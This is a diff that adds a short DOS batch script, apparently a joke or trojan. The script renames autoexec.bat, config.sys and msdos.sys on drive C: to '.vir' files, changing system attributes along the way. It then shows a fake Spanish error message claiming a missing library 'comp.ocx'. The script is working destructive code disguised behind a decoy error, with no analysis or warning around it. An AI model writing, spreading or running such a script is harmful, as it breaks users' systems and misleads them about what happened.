@@ -1,0 +1,21 @@
+cd\
+c:
+cd\
+ren autoexec.bat autoexec.vir
+ren config.sys config.vir
+attrib -s msdos.sys
+attrib -r msdos.sys
+ren msdos.sys msdos.vir
+attrib +s msdos.vir
+attrib +r msdos.vir
+cls
+@echo off
+echo.
+echo EL PROGRAMA NECESITA La LIBRERIA comp.ocx.
+echo.
+echo.
+echo.
+echo.
+echo.
+echo ERROR de libreria Revise su libreria.
+echo.
